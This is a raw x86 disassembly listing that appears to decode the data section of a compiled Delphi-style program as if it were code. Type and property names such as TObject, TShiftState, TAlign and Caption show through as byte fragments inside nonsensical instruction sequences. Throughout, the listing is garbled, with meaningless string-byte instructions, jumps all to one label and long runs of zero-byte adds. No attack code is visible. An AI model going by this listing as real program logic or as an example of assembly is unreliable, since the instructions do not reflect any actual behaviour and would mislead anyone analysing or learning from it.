add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1c ] si
adc [ eax ] eax
jl r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
ja r-xdata
pop es
inc edx
outsd
outsd
insb
push 0x65
jb r-xdata
inc ebx
jpe r-xdata
add eax 0x65530608
outsb
jb r-xdata
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add ah dl
loope r-xdata
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] bl
inc eax
add ah dl
loope r-xdata
inc edx
outsd
outsd
insb
popad
outsb
outsb
jb r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
inc eax
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
rcr ch 0x43
jpe r-xdata
jb r-xdata
add [ ecx + ebp * 8 + 0x10000043 ] ch
inc eax
add al ch
fild [ ebx ]
or [ edi ] cl
push esp
push ebx
je r-xdata
add eax 0x65530608
outsb
jb r-xdata
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x43de48c0 ] cl
add [ eax ] cl
push ss
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x43ddc0c0 ] cl
add [ eax + edx + 0x40 ] dl
jbe r-xdata
inc ebp
push edx
jae r-xdata
push es
jb r-xdata
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
outsb
je r-xdata
push edi
push 0x556c6565
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
dec eax
fiadd [ ebx ]
or [ esi ] dl
je r-xdata
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
je r-xdata
jpe r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
loopne r-xdata
js r-xdata
insb
outsd
ja r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
sbb al 0x11
inc eax
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
add [ eax ] ecx
arpl [ ecx + eax + 0x8 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
xor ch bl
inc ebx
add [ eax ] cl
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
inc esp
add [ eax ] bh
add dl cl
loope r-xdata
and eax [ eax + eax + 0x38 ]
add [ eax ] al
add al 0x2c
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
js r-xdata
outsb
je r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax + 0x16 ] dl
inc esp
add [ eax ] ah
xor eax 0x351c0044
inc esp
add ah ch
xor eax 0x18940044
inc esp
add al bl
pop ds
inc esp
add [ edi + ebx ] bh
inc esp
add [ eax + ebp + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0x381c0044
inc esp
add al bl
dec eax
inc esp
add [ edx + ebp ] ah
inc esp
add [ eax + 0xc00442a ] bl
sbb eax [ eax + eax + 0x78 ]
sub al [ eax + eax + 0xe ]
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x800040 ] bh
add [ eax ] al
mov esp 0x54004010
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
inc esp
add [ eax ] bh
inc ecx
add [ ecx + eax ] bl
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x4fffbfcb ] ah
cmp [ eax + eax - 0x24 ] eax
xor al [ eax ]
clc
xor al [ eax ]
sub [ edi ] dl
jo r-xdata
add [ esp + ebp ] al
inc ebp
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ eax + 0x54004119 ] ch
adc [ eax ] al
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
dec ebp
outsd
jne r-xdata
je r-xdata
add al 0x8
push es
lea eax [ eax ]
pushad
fild [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
fild [ ebx ]
fsub st1
inc ebx
add [ eax ] al
jbe r-xdata
outsb
je r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ eax + 0x4119 ] ch
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov esp 0x80043de
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
inc esp
add [ eax - 0x77ffbbba ] dl
cmp al [ eax + eax - 0x4c ]
dec ecx
inc ecx
add [ eax + 0x46 ] bl
inc esp
add [ eax ] ah
sbb al [ eax + eax - 0x74 ]
sbb [ eax + eax + 0x38 ] eax
add [ eax ] ch
pop ss
push eax
outsd
jae r-xdata
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
adc [ eax ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
sub_43d0cc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
rol [ ebx ] 0x1
inc eax
add [ eax ] al
add [ eax + edx * 8 ] al
inc ebx
add [ ebp + esi - 0x4c3ffc0 ] cl
inc ebx
add [ ebx + edi * 8 ] ch
inc ebx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add al cl
sti
inc ebx
add ah bh
sti
inc ebx
add [ esp + edi * 8 ] dl
inc ebx
add [ eax + 0x700043f9 ] bh
sti
inc ebx
add [ ecx + edi * 8 + 0x43 ] bh
add [ eax ] ah
cld
inc ebx
add ah dl
cli
inc ebx
add [ eax - 0x4 ] al
inc ebx
add [ ebx + edi * 8 - 0x4b3ffbd ] bl
inc ebx
add [ edx ] dl
push esp
inc esp
jb r-xdata
inc ebx
add [ esp + edi * 8 ] dl
inc ebx
add [ eax + 0x700043f9 ] bh
sti
inc ebx
add [ ecx + edi * 8 + 0x43 ] bh
add [ eax ] ah
cld
inc ebx
add ah dl
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax - 0x2 ] al
inc ebx
add [ edx + edi * 8 - 0x647ffbd ] dh
inc ebx
add al bh
inc ebx
outsd
outsb
je r-xdata
cli
inc ebx
add [ eax - 0x4 ] al
inc ebx
add [ ebx + edi * 8 - 0x4b3ffbd ] bl
inc ebx
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x60 ] si
rol [ ebx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
inc ebx
add [ ebp + esi - 0x4c3ffc0 ] cl
inc ebx
add [ esi + edi * 8 + 0x43 ] dl
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
enter 0x43fc 0x0
enter 0x43fb 0x0
inc eax
inc [ ebx ]
mov ah 0xfa
inc ebx
add [ eax - 0x7ffbc07 ] bh
cld
inc ebx
add [ ecx + edi * 8 + 0x43 ] bh
add al dl
cli
inc ebx
add ah dl
cli
inc ebx
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax * 4 - 0x2e ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + esi - 0x2e ] si
inc ebx
add [ eax + edx * 8 + 0x43 ] dl
or [ ebx + 0x6f ] al
outsb
je r-xdata
cli
inc ebx
add ah dl
cli
inc ebx
add ah bl
cli
inc ebx
add [ ebp + edi * 8 + 0x43 ] dl
add [ esp + edi * 8 + 0x43 ] ah
add [ ebp + edi * 8 - 0x1e7ffbd ] bl
inc ebx
add [ esi + edi * 8 ] ch
inc ebx
add [ esi + edi * 8 + 0x43 ] cl
add [ edi ] cl
push esp
inc esp
jb r-xdata
cld
inc ebx
add [ ecx + edi * 8 + 0x43 ] bh
add al dl
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
xor dl dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 8 + 0x43 ] ch
add [ eax ] dh
add [ eax ] al
add al 0xd0
inc ebx
add [ ebp + esi - 0x4c3ffc0 ] cl
inc ebx
add [ ebx + edi * 8 ] ch
inc ebx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
enter 0x43fc 0x0
enter 0x43fb 0x0
inc eax
inc [ ebx ]
mov ah 0xfa
inc ebx
add [ eax - 0x7ffbc07 ] bh
inc ecx
add [ ecx + ecx * 2 - 0x1c6fffbf ] dh
inc ecx
add [ ebx + 0x41 ] bh
add [ eax + 0x10 ] dl
inc esp
add [ esi ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
nop
rol [ ebx ] cl
add ah bl
cli
inc ebx
add [ ebp + edi * 8 + 0x43 ] dl
add [ esp + edi * 8 + 0x43 ] ah
add [ ebp + edi * 8 - 0x1e7ffbd ] bl
inc ebx
add [ esi + edi * 8 ] ch
inc ebx
add [ esi + edi * 8 + 0x43 ] cl
add [ ecx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
xor eax 0x32dc0040
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ ebx + 0x43d2f4c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
rol [ ebx ] cl
jo r-xdata
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x43d4c490
add [ ebx ] al
or al 0x54
inc eax
add al bh
xor al [ eax ]
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
jae r-xdata
add [ eax ] al
in al 0xd1
add [ eax + 0x60043d5 ] cl
outsd
insd
popad
je r-xdata
inc ebx
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x43d3
add [ eax ] al
add [ eax ] al
mov esp 0x70043d3
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
inc eax
add [ eax ] dh
salc
inc ebx
add [ esi ] al
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
inc ecx
add [ esp + edx - 0x598bffbc ] dh
inc ecx
add [ eax + 0x15 ] ah
inc esp
add ah al
movsd [ edi ] [ esi ]
inc ecx
add [ eax - 0x5a ] bl
inc ecx
add [ esi + 0x13a00041 ] ch
inc esp
add [ ebx + ebp * 8 + 0x14140044 ] dl
inc esp
add [ ebx + ebp * 8 - 0x142fffbc ] bh
inc esp
add [ ebp + edx + 0x14480044 ] cl
inc esp
add [ esp + ebp * 8 ] cl
inc esp
add [ eax ] ah
in al dx
inc esp
add [ eax + 0x48004414 ] al
in al dx
inc esp
add ah bl
adc al 0x44
add [ eax - 0x14 ] dl
inc esp
add ah bh
adc al 0x44
add [ eax - 0x14 ] bl
inc esp
add [ eax ] dl
push ss
inc esp
add al dh
adc eax 0x16300044
inc esp
add [ edx - 0x1393ffbc ] bl
inc esp
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
adc [ eax + eax - 0x60 ] eax
dec edx
add esp esp
aad 0x43
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx * 8 + 0x640b0043 ] bh
jae r-xdata
rcl ch 0x43
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al al
aam 0x43
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
or al 0xa6
inc ecx
add [ edx + edx - 0x59bfffbc ] dl
jae r-xdata
dec ebp
popad
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
aad 0x43
add [ esi ] al
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
rol [ eax - 0x2b ] 0x43
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x640043d3 ] ch
add [ eax ] al
add ah cl
mov ebx 0x358c0041
inc eax
add [ eax - 0x63ffbfcb ] bl
xor eax 0x35a00040
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
and al 0x10
inc esp
add [ eax - 0x5fffbeb6 ] bl
dec edx
rol [ ebx ] cl
cmp [ ecx + eax * 2 + 0x8000400 ] bh
inc ebx
outsd
outsb
je r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
hlt
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
hlt
inc ebx
outsd
outsb
jae r-xdata
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
add [ eax - 0x4bffbeb6 ] ah
dec ecx
inc ecx
add [ eax + 0x70004412 ] al
adc [ eax + eax + 0x10 ] eax
imul ebp [ esi + 0x74 ] 0x657a6953
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
inc ecx
add [ ecx + ecx * 2 + 0x12800041 ] dh
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
inc ecx
add [ eax - 0x6bffbbed ] ah
jmp r-xdata
outsd
insb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x43d64074
jb r-xdata
popad
js r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc eax
add al bh
xor al [ eax ]
mov [ ecx + 0x41 ] cl
add [ ecx + edx + 0x4aa00044 ] ch
mov al [ 0xffffffff94004035 ]
xor eax 0x32dc0040
outsd
insb
inc ebx
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
aad 0x43
add [ ebx ] al
add [ eax - 0x14 ] dh
inc esp
add [ eax + 0x15 ] al
inc esp
add [ eax + 0x12004412 ] dh
push esp
inc ebx
outsd
outsb
je r-xdata
add [ esp + ebp * 8 + 0x44 ] ch
add [ ebp - 0x2bcfffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edx * 8 + 0x1c0043 ] ch
add [ eax ] al
lodsb [ esi ]
in al 0x44
add [ ebp + esi + 0x35980040 ] cl
inc eax
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x43d80cc0 ] cl
outsb
je r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
pop es
add [ eax + eax ] dl
add bh bh
hlt
salc
salc
inc ebx
add [ eax ] dl
add [ eax ] al
push esp
adc [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
imul ebp [ esi + 0x74 ] 0x43d6ac73
add [ ecx + 0x41 ] dl
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
fcom st6
inc ebx
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jae r-xdata
jb r-xdata
jpe r-xdata
imul ebp [ edi + 0x6e ] 0xd5e8c08b
inc ebx
add [ ebx ] al
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
add [ ecx ] al
add [ eax ] al
lea eax [ eax ]
mov ebp ss
inc ebx
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
insb
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
inc ebx
outsd
insb
jae r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
jae r-xdata
insb
jae r-xdata
inc esp
add [ eax + 0x11 ] dh
inc esp
add [ eax ] dl
add eax 0x0
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
inc ebx
imul ebp [ esi + 0x64 ] 0x1
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
outsb
mov eax eax
call 0x34419be
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx + edx ] bl
inc eax
add [ eax - 0x57ffbff0 ] al
sbb [ ecx ] eax
nop
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
add [ eax ] cl
add [ eax ] al
push esp
adc [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
add [ eax - 0x2a ] al
inc ebx
dec esp
popad
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add [ ebx ] al
add [ eax ] al
add ah ah
aad 0x43
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ ecx + edx ] bl
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
mov esp 0x80043d8
adc [ eax ] 0x40
add [ eax - 0x6fffbee7 ] ch
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
imul esp [ edi + 0x68 ] 0x43d64074
imul esp [ gs : edi + 0x68 ] 0x43d64074
add [ eax + eax ] cl
add bh bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
aad 0x43
add [ eax ] cl
insd
dec ebp
popad
outsb
jne r-xdata
inc eax
add [ ebp + edx * 8 + 0x9030043 ] cl
push esp
inc esp
jb r-xdata
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ edx * 8 + 0x10000043 ] bh
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
sbb al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
outsb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
push cs
inc ebx
add [ eax ] cl
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
loopne r-xdata
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
push esp
inc esp
jb r-xdata
push esp
adc [ eax ] al
push esp
adc [ eax ] al
cmp al 0xd5
inc ebx
add [ eax ] al
adc [ eax ] al
nop
sbb cl 0x43
add [ eax ] cl
push cs
outsb
je r-xdata
sbb al 0x11
inc eax
add [ eax + 0x54004119 ] ch
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
jo r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
sbb al 0x11
inc eax
add ah bl
iretd
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
outsb
je r-xdata
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
dec ecx
outsb
inc ebx
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
